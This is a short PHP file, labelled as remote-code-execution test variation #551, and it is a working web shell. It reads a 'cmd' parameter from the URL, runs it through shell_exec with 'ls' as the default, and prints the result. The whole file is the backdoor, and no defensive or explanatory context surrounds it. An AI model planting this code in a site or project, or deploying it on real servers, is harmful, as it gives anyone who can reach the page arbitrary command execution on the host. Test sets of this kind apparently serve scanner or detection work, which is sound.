<?php
// RCE test variation #551
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>